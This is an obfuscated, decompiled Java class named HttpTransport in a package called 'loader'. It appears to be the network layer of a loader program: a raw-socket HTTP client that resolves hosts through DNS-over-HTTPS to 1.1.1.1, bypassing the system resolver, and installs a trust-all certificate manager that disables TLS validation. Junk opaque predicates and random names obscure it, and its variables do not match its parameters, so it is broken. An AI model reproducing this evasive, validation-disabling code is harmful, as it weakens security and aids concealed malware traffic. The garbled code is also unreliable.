package net.efn.loader;

import java.io.BufferedInputStream;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.URI;
import java.net.URL;
import java.nio.ByteBuffer;
import java.nio.charset.StandardCharsets;
import java.security.SecureRandom;
import java.security.cert.X509Certificate;
import java.util.Base64;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.Map.Entry;
import java.util.concurrent.ConcurrentHashMap;
import javax.net.ssl.SNIHostName;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLParameters;
import javax.net.ssl.SSLSocket;
import javax.net.ssl.SSLSocketFactory;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;

public class HttpTransport {
   private static final Map<String, HttpTransport.CacheEntry> bkdfL = new ConcurrentHashMap<>();
   private static SSLSocketFactory aaVnhcimIdhf;

   public static HttpTransport.Response get(String urlStr) throws IOException {
      return kviXgqueVgguFpawvsc("GET", capSum, null, null, null);
   }

   public static HttpTransport.Response get(String urlStr, Map<String, String> headers) throws IOException {
      return kviXgqueVgguFpawvsc("GET", my_ejc_uxj, null, null, ExS);
   }

   public static HttpTransport.Response daiavydyStore(String urlStr, String body, String contentType) throws IOException {
      StringBuilder var3 = new StringBuilder();
      return kviXgqueVgguFpawvsc("POST", HrGr_GZaN_KAOb_ZlBp, CECz_FYBI_Eard_rnOS, ldcC_nZHX_lXmi_dkqh, null);
   }

   public static HttpTransport.Response bFguUEehmav(String urlStr, String body, String contentType, Map<String, String> headers) throws IOException {
      StringBuilder var4 = new StringBuilder();
      return kviXgqueVgguFpawvsc("POST", ghfajg_jteynt_ytpigy, vVal, dQkY02NtE_TpB, afzta_lvbb_zkgowj_zarycm);
   }

   public static HttpTransport.Response put(String urlStr, String body, String contentType, Map<String, String> headers) throws IOException {
      return kviXgqueVgguFpawvsc("PUT", tqnuB, ACyV, sGnk_lDWg_CzOw_ePcU, refBuf);
   }

   public static HttpTransport.Response kviXgqueVgguFpawvsc(String method, String urlStr, String body, String contentType, Map<String, String> customHeaders) throws IOException {
      URL nodebuf = URI.create(r0me4iK9ZrM_K).toURL();
      String kivoxnLfuDoOkmlby = nodebuf.getHost();
      int rgj_dqcc = nodebuf.getPort();
      String var10000 = nodebuf.getProtocol();
      boolean il_nx_wwhpu_cbzq = var10000.equalsIgnoreCase("https");
      if (rgj_dqcc == -1) {
         rgj_dqcc = il_nx_wwhpu_cbzq ? 443 : 80;
      }

      String NhUk_UlPc_yIWa_zyWW = nodebuf.getPath();
      if (NhUk_UlPc_yIWa_zyWW == null || NhUk_UlPc_yIWa_zyWW.isEmpty()) {
         NhUk_UlPc_yIWa_zyWW = "/";
      }

      if (nodebuf.getQuery() != null) {
         String var25 = nodebuf.getQuery();
         NhUk_UlPc_yIWa_zyWW = NhUk_UlPc_yIWa_zyWW + "?" + var25;
      }

      String UdFP_DklO_erui_zXcm = ZYHh_wp(kivoxnLfuDoOkmlby);
      Socket ref4 = new Socket();
      ref4.setReceiveBufferSize(524288);
      ref4.connect(new InetSocketAddress(UdFP_DklO_erui_zXcm, rgj_dqcc), 10000);
      ref4.setSoTimeout(30000);
      Socket elemIn;
      if (il_nx_wwhpu_cbzq) {
         SSLSocket geyisWjuliiZzsHq = (SSLSocket)aaVnhcimIdhf.createSocket(ref4, kivoxnLfuDoOkmlby, rgj_dqcc, true);
         SSLParameters fUBNv1fIqMs0dK = geyisWjuliiZzsHq.getSSLParameters();
         fUBNv1fIqMs0dK.setServerNames(List.of(new SNIHostName(kivoxnLfuDoOkmlby)));
         StringBuilder var26 = new StringBuilder();
         fUBNv1fIqMs0dK.setEndpointIdentificationAlgorithm("HTTPS");
         geyisWjuliiZzsHq.setSSLParameters(fUBNv1fIqMs0dK);
         geyisWjuliiZzsHq.startHandshake();
         elemIn = geyisWjuliiZzsHq;
      } else {
         elemIn = ref4;
      }

      HttpTransport.Response var69;
      try {
         OutputStream bcgkHx = elemIn.getOutputStream();
         InputStream tIVL_n = elemIn.getInputStream();
         StringBuilder GYsioeyJrL_W6 = new StringBuilder();
         StringBuilder var70 = GYsioeyJrL_W6.append(argPos).append(" ").append(NhUk_UlPc_yIWa_zyWW);
         StringBuilder var28 = new StringBuilder();
         var70.append(" HTTP/1.1\r\n");
         GYsioeyJrL_W6.append("Host: ").append(kivoxnLfuDoOkmlby);
         if (il_nx_wwhpu_cbzq && rgj_dqcc != 443 || !il_nx_wwhpu_cbzq && rgj_dqcc != 80) {
            GYsioeyJrL_W6.append(":").append(rgj_dqcc);
         }

         StringBuilder var32 = new StringBuilder();
         boolean limitOut = false;
         boolean cursorMin = false;
         if (zIPX__7f != null) {
            for (Entry JgqOZs : zIPX__7f.entrySet()) {
               String ref3 = (String)JgqOZs.getKey();
               if (!ref3.equalsIgnoreCase("Host")) {
                  if (!ref3.equalsIgnoreCase("Connection")) {
                     StringBuilder var38 = new StringBuilder();
                     if (!ref3.equalsIgnoreCase("Content-Length")) {
                        if (ref3.equalsIgnoreCase("Accept")) {
                           limitOut = true;
                        }

                        if (ref3.equalsIgnoreCase("User-Agent")) {
                           cursorMin = true;
                        }

                        GYsioeyJrL_W6.append(ref3).append(": ").append((String)JgqOZs.getValue()).append("\r\n");
                     }
                  }
               }
            }
         }

         if (!limitOut) {
         }

         if (!cursorMin) {
            StringBuilder var46 = new StringBuilder();
            StringBuilder var47 = new StringBuilder();
            StringBuilder var49 = new StringBuilder();
            StringBuilder var53 = new StringBuilder();
         }

         byte[] uOcT = null;
         if (_W6yoD != null) {
            uOcT = _W6yoD.getBytes(StandardCharsets.UTF_8);
            if (posSum != null) {
               GYsioeyJrL_W6.append("Content-Type: ").append(posSum).append("\r\n");
            }

            StringBuilder var63 = new StringBuilder();
            GYsioeyJrL_W6.append("Content-Length: ").append(uOcT.length).append("\r\n");
         }

         bcgkHx.write(GYsioeyJrL_W6.toString().getBytes(StandardCharsets.ISO_8859_1));
         if (uOcT != null) {
            bcgkHx.write(uOcT);
         }

         bcgkHx.flush();
         var69 = copyUzzcstd(tIVL_n);
      } finally {
         elemIn.close();
      }

      return var69;
   }

   private static HttpTransport.Response copyUzzcstd(InputStream in) throws IOException {
      BufferedInputStream c0 = new BufferedInputStream(bjCtswOfcwfr);
      ByteArrayOutputStream n5 = new ByteArrayOutputStream();
      int JnHU0vmczfLF67 = -1;

      int awblo_qz_ddusnd;
      while ((awblo_qz_ddusnd = c0.read()) != -1) {
         n5.write(awblo_qz_ddusnd);
         if (JnHU0vmczfLF67 == 13 && awblo_qz_ddusnd == 10) {
            int vx7hxv = n5.size();
            byte[] bufPos = n5.toByteArray();
            if (vx7hxv >= 4 && bufPos[vx7hxv - 4] == 13 && bufPos[vx7hxv - 3] == 10) {
               break;
            }
         }

         JnHU0vmczfLF67 = awblo_qz_ddusnd;
      }

      String AlhGO5 = n5.toString(StandardCharsets.ISO_8859_1);
      String[] vnngooAggqac = AlhGO5.split("\r\n");
      String aidx = vnngooAggqac.length > 0 ? vnngooAggqac[0] : "";
      int qyGlrtcOpytFzmrar = 0;
      StringBuilder var18 = new StringBuilder();
      if (aidx.startsWith("HTTP/")) {
         int QVWi3DY_TFE = aidx.indexOf(32);
         if (QVWi3DY_TFE > 0) {
            int nvuMzflmsMoa = aidx.indexOf(32, QVWi3DY_TFE + 1);
            String paramPos = nvuMzflmsMoa > 0 ? aidx.substring(QVWi3DY_TFE + 1, nvuMzflmsMoa) : aidx.substring(QVWi3DY_TFE + 1);

            try {
               qyGlrtcOpytFzmrar = Integer.parseInt(paramPos.trim());
            } catch (NumberFormatException var26) {
            }
         }
      }

      Map DmL_8ek_foCn = new LinkedHashMap();
      int entry5 = -1;
      boolean flagsCnt = false;

      for (int ytPqyqhMdh = 1; ytPqyqhMdh < vnngooAggqac.length; ytPqyqhMdh++) {
         String strSum = vnngooAggqac[ytPqyqhMdh];
         int xydyktFpalplXdef = strSum.indexOf(58);
         if (xydyktFpalplXdef > 0) {
            String rgrfWh_Tw06xU = strSum.substring(0, xydyktFpalplXdef).trim().toLowerCase();
            String YDCF_wCic_uZQh_mQGY = strSum.substring(xydyktFpalplXdef + 1).trim();
            DmL_8ek_foCn.put(rgrfWh_Tw06xU, YDCF_wCic_uZQh_mQGY);
            StringBuilder var20 = new StringBuilder();
            if (rgrfWh_Tw06xU.equals("content-length")) {
               try {
                  entry5 = Integer.parseInt(YDCF_wCic_uZQh_mQGY);
               } catch (NumberFormatException var25) {
               }
            } else {
               StringBuilder var22 = new StringBuilder();
               if (rgrfWh_Tw06xU.equals("transfer-encoding")) {
                  String var10000 = YDCF_wCic_uZQh_mQGY.toLowerCase();
                  if (var10000.contains("chunked")) {
                     flagsCnt = true;
                  }
               }
            }
         }
      }

      byte[] blqjo_esu_knbzno;
      if (flagsCnt) {
         blqjo_esu_knbzno = bphhYgdqvapClplmKnawnpe(c0);
      } else if (entry5 >= 0) {
         blqjo_esu_knbzno = new byte[entry5];
         int uafP_mPgQ_OSXS_aLRn = 0;

         while (uafP_mPgQ_OSXS_aLRn < entry5) {
            int VIa6Pm = c0.read(blqjo_esu_knbzno, uafP_mPgQ_OSXS_aLRn, entry5 - uafP_mPgQ_OSXS_aLRn);
            if (VIa6Pm == -1) {
               break;
            }

            uafP_mPgQ_OSXS_aLRn += VIa6Pm;
         }
      } else {
         ByteArrayOutputStream ptrCnt = new ByteArrayOutputStream(1048576);
         byte[] koh_pz_ni_vfn = new byte[131072];

         int mMax;
         while ((mMax = c0.read(koh_pz_ni_vfn)) != -1) {
            ptrCnt.write(koh_pz_ni_vfn, 0, mMax);
         }

         blqjo_esu_knbzno = ptrCnt.toByteArray();
      }

      return new HttpTransport.Response(qyGlrtcOpytFzmrar, aidx, DmL_8ek_foCn, blqjo_esu_knbzno);
   }

   private static byte[] bphhYgdqvapClplmKnawnpe(InputStream in) throws IOException {
      ByteArrayOutputStream avd_sjue_oef_cd = new ByteArrayOutputStream(1048576);
      StringBuilder uHaF_nsmG_ZqzS_UgNC = new StringBuilder();

      while (true) {
         uHaF_nsmG_ZqzS_UgNC.setLength(0);

         int prevData;
         while ((prevData = bIdx.read()) != -1 && prevData != 13) {
            uHaF_nsmG_ZqzS_UgNC.append((char)prevData);
         }

         if (prevData == 13) {
            bIdx.read();
         }

         String bVal = uHaF_nsmG_ZqzS_UgNC.toString();
         int jjqzjm_hbhds_pns = bVal.indexOf(59);
         if (jjqzjm_hbhds_pns >= 0) {
            bVal = bVal.substring(0, jjqzjm_hbhds_pns);
         }

         if (bVal.isEmpty()) {
            break;
         }

         int cesutvAnfsu = Integer.parseInt(bVal.trim(), 16);
         if (cesutvAnfsu == 0) {
            break;
         }

         byte[] val5 = new byte[cesutvAnfsu];
         int lenStr = 0;

         while (true) {
            if (lenStr < cesutvAnfsu) {
               int found1 = bIdx.read(val5, lenStr, cesutvAnfsu - lenStr);
               if (found1 != -1) {
                  lenStr += found1;
                  continue;
               }
            }

            avd_sjue_oef_cd.write(val5, 0, lenStr);
            bIdx.read();
            bIdx.read();
            break;
         }
      }

      return avd_sjue_oef_cd.toByteArray();
   }

   public static String ZYHh_wp(String hostname) throws IOException {
      if (nrwGcqJx(yWoFhgbxTeDr0p)) {
         return yWoFhgbxTeDr0p;
      } else {
         HttpTransport.CacheEntry wtHl_DSuE_XgOu_xoZD = bkdfL.get(yWoFhgbxTeDr0p);
         int var5 = 1923225513;
         if ((var5 & 1923225513) == 1923225513) {
            var5 = -475800770;
            var5 <<= 3;
            var5 >>>= 26;
            int var6 = 235345628;
            var6 += 121;
            var6 ^= -2001078766;
            var6 <<= 2;
         }

         if (wtHl_DSuE_XgOu_xoZD != null && !wtHl_DSuE_XgOu_xoZD.isExpired()) {
            return wtHl_DSuE_XgOu_xoZD.ip;
         } else {
            byte[] ebmheJviSvsatTebd = dkgDY(yWoFhgbxTeDr0p);
            byte[] ULeh_GmlR_FFEQ_lKwu = jZCRZvW7(ebmheJviSvsatTebd);
            String BkWSmBEaCKabOk = fqqnxm(ULeh_GmlR_FFEQ_lKwu);
            if (BkWSmBEaCKabOk != null) {
               bkdfL.put(yWoFhgbxTeDr0p, new HttpTransport.CacheEntry(BkWSmBEaCKabOk, System.currentTimeMillis() + 300000L));
            }

            return BkWSmBEaCKabOk;
         }
      }
   }

   private static boolean nrwGcqJx(String s) {
      if (GUwp_mmCA_AyhC_Gkxl != null && !GUwp_mmCA_AyhC_Gkxl.isEmpty()) {
         for (int varLen = 0; varLen < GUwp_mmCA_AyhC_Gkxl.length(); varLen++) {
            char cOut = GUwp_mmCA_AyhC_Gkxl.charAt(varLen);
            if (cOut != '.' && (cOut < '0' || cOut > '9')) {
               return false;
            }
         }

         return GUwp_mmCA_AyhC_Gkxl.contains(".");
      } else {
         return false;
      }
   }

   private static byte[] dkgDY(String hostname) {
      ByteArrayOutputStream QaeW = new ByteArrayOutputStream();
      DataOutputStream holderlen = new DataOutputStream(QaeW);

      try {
         short mAcc = (short)(System.nanoTime() & 65535L);
         holderlen.writeShort(mAcc);
         holderlen.writeShort(256);
         holderlen.writeShort(1);
         holderlen.writeShort(0);
         holderlen.writeShort(0);
         holderlen.writeShort(0);
         String[] var4 = val1.split("\\.");
         int var5 = var4.length;
         int var6 = 0;

         while (true) {
            int var8 = 766765519;
            if ((var8 ^ 766765519) == 0) {
               var8 = 1013898868;
               var8 <<= 24;
               var8 >>>= 29;
               int var9 = -637426552;
               var9 ^= -1932879729;
            }

            if (var6 >= var5) {
               holderlen.writeByte(0);
               holderlen.writeShort(1);
               holderlen.writeShort(1);
               return QaeW.toByteArray();
            }

            String v4 = var4[var6];
            holderlen.writeByte(v4.length());
            holderlen.writeBytes(v4);
            var6++;
         }
      } catch (IOException var10) {
         throw new RuntimeException(var10);
      }
   }

   private static byte[] jZCRZvW7(byte[] dnsQuery) throws IOException {
      Socket punq_qwpqkh_uil_kuwhbg = new Socket();
      punq_qwpqkh_uil_kuwhbg.connect(new InetSocketAddress("1.1.1.1", 443), 10000);
      punq_qwpqkh_uil_kuwhbg.setSoTimeout(30000);
      SSLSocket pddvik_sk_wnaw_hxgmyo = (SSLSocket)aaVnhcimIdhf.createSocket(punq_qwpqkh_uil_kuwhbg, "cloudflare-dns.com", 443, true);
      SSLParameters jjkjOqb = pddvik_sk_wnaw_hxgmyo.getSSLParameters();
      jjkjOqb.setServerNames(List.of(new SNIHostName("cloudflare-dns.com")));
      pddvik_sk_wnaw_hxgmyo.setSSLParameters(jjkjOqb);
      pddvik_sk_wnaw_hxgmyo.startHandshake();

      byte[] var9;
      try {
         OutputStream oJy6hjTT = pddvik_sk_wnaw_hxgmyo.getOutputStream();
         InputStream r2zXx = pddvik_sk_wnaw_hxgmyo.getInputStream();
         String head2 = Base64.getUrlEncoder().withoutPadding().encodeToString(tfa_bcblg);
         StringBuilder itemRaw = new StringBuilder();
         StringBuilder var10000 = itemRaw.append("GET /dns-query?dns=").append(head2);
         var10000.append(" HTTP/1.1\r\n");
         StringBuilder var21 = new StringBuilder();
         StringBuilder var22 = new StringBuilder();
         StringBuilder var24 = new StringBuilder();
         StringBuilder var26 = new StringBuilder();
         StringBuilder var27 = new StringBuilder();
         StringBuilder var31 = new StringBuilder();
         int var34 = 502206664;
         if (var34 - 502206664 == 0) {
            var34 = 2040284577;
            var34 <<= 19;
            var34 >>>= 27;
         }

         oJy6hjTT.write(itemRaw.toString().getBytes(StandardCharsets.ISO_8859_1));
         oJy6hjTT.flush();
         HttpTransport.Response nzyqrYabrtgXrdnc = copyUzzcstd(r2zXx);
         var9 = nzyqrYabrtgXrdnc.body;
      } finally {
         pddvik_sk_wnaw_hxgmyo.close();
      }

      return var9;
   }

   private static String fqqnxm(byte[] response) {
      if (HxlMuXhEB != null && HxlMuXhEB.length >= 12) {
         ByteBuffer bkxUdH9l_0vD = ByteBuffer.wrap(HxlMuXhEB);
         bkxUdH9l_0vD.getShort();
         short muj_qsqrl_xo = bkxUdH9l_0vD.getShort();
         if ((muj_qsqrl_xo & '\u8000') == 0) {
            return null;
         } else {
            int optsacc = muj_qsqrl_xo & 15;
            if (optsacc != 0) {
               return null;
            } else {
               int hDBZ_TsHT_drue_xRSX = bkxUdH9l_0vD.getShort() & '\uffff';
               int sBOg_upsM_kETP_NLAQ = bkxUdH9l_0vD.getShort() & '\uffff';
               bkxUdH9l_0vD.getShort();
               bkxUdH9l_0vD.getShort();

               for (int bfvkMorayPvlgVwvi = 0; bfvkMorayPvlgVwvi < hDBZ_TsHT_drue_xRSX; bfvkMorayPvlgVwvi++) {
                  yfkny3(bkxUdH9l_0vD);
                  bkxUdH9l_0vD.getShort();
                  bkxUdH9l_0vD.getShort();
               }

               for (int gyCq5_n = 0; gyCq5_n < sBOg_upsM_kETP_NLAQ; gyCq5_n++) {
                  yfkny3(bkxUdH9l_0vD);
                  int le_xihkhw_fghox = bkxUdH9l_0vD.getShort() & '\uffff';
                  bkxUdH9l_0vD.getShort();
                  bkxUdH9l_0vD.getInt();
                  int vPtr = bkxUdH9l_0vD.getShort() & '\uffff';
                  if (le_xihkhw_fghox == 1 && vPtr == 4) {
                     byte[] hk_hcn_lfb_add = new byte[4];
                     bkxUdH9l_0vD.get(hk_hcn_lfb_add);
                     int var10000 = hk_hcn_lfb_add[0] & 255;
                     int var10001 = hk_hcn_lfb_add[1] & 255;
                     int var10002 = hk_hcn_lfb_add[2] & 255;
                     int var13 = hk_hcn_lfb_add[3] & 255;
                     int var12 = var10002;
                     int var11 = var10001;
                     int var10 = var10000;
                     return var10 + "." + var11 + "." + var12 + "." + var13;
                  }

                  bkxUdH9l_0vD.position(bkxUdH9l_0vD.position() + vPtr);
               }

               return null;
            }
         }
      } else {
         return null;
      }
   }

   private static void yfkny3(ByteBuffer buf) {
      while (temp1.hasRemaining()) {
         int glvmzFkyko = temp1.get() & 255;
         if (glvmzFkyko != 0) {
            if ((glvmzFkyko & 192) != 192) {
               temp1.position(temp1.position() + glvmzFkyko);
               continue;
            } else {
               temp1.get();
            }
         }
         break;
      }
   }

   static {
      try {
         SSLContext yMax = SSLContext.getInstance("TLS");
         yMax.init(null, new TrustManager[]{new HttpTransport.TrustAll()}, new SecureRandom());
         aaVnhcimIdhf = yMax.getSocketFactory();
      } catch (Exception var1) {
         aaVnhcimIdhf = (SSLSocketFactory)SSLSocketFactory.getDefault();
      }
   }

   private static class CacheEntry {
      final String ip;
      final long expiresAt;

      CacheEntry(String ip, long expiresAt) {
         gkuaJzmxmVsosd.ip = oyrWxvtnoZveAyg;
         gkuaJzmxmVsosd.expiresAt = vfbkQmxtpe;
      }

      boolean isExpired() {
         return System.currentTimeMillis() > _Nde.expiresAt;
      }
   }

   public static class Response {
      public final int statusCode;
      public final String statusLine;
      public final Map<String, String> headers;
      public final byte[] body;

      Response(int statusCode, String statusLine, Map<String, String> headers, byte[] body) {
         configAvg.statusCode = posAcc;
         configAvg.statusLine = lruFxuewRfejOqdxqw;
         configAvg.headers = b5o_AE8_vVz;
         configAvg.body = configTmp;
      }

      public String bodyString() {
         return new String(mRef.body, StandardCharsets.UTF_8);
      }

      public String header(String name) {
         return bbejolBpzbb.headers.get(k3.toLowerCase());
      }
   }

   private static class TrustAll implements X509TrustManager {
      @Override
      public void checkClientTrusted(X509Certificate[] chain, String authType) {
      }

      @Override
      public void checkServerTrusted(X509Certificate[] chain, String authType) {
      }

      @Override
      public X509Certificate[] getAcceptedIssuers() {
         return new X509Certificate[0];
      }
   }
}
